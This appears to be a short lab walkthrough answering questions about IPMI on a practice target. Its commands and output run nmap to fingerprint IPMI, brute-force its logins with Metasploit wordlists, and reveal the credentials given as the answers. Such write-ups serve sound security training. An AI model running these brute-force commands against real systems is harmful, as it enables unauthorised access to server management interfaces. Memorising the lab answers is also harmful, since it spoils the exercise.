# IPMI

### What username is configured for accessing the host via IPMI?

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sU --script ipmi-version -p 623 10.129.202.5          
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 05:17 EST
Nmap scan report for 10.129.202.5 (10.129.202.5)
Host is up (0.27s latency).

PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-version: 
|   Version: 
|     IPMI-2.0
|   UserAuth: password, md5, md2, null
|   PassAuth: auth_msg, auth_user, non_null_user
|_  Level: 1.5, 2.0
```

we use nmap script to brute force the user and password

```bash
sudo nmap -sU --script ipmi-brute -p 623 10.129.202.5
#sudo nmap -sU --script ipmi-brute --script-args userdb=/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt passdb=/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt -p 623 10.129.202.5
PORT    STATE SERVICE
623/udp open  asf-rmcp
| ipmi-brute: 
|   Accounts: 
|     admin:trinity - Valid credentials
|_  Statistics: Performed 12236 guesses in 600 seconds, average tps: 18.2
```

admin

### What is the account's cleartext password?

trinity
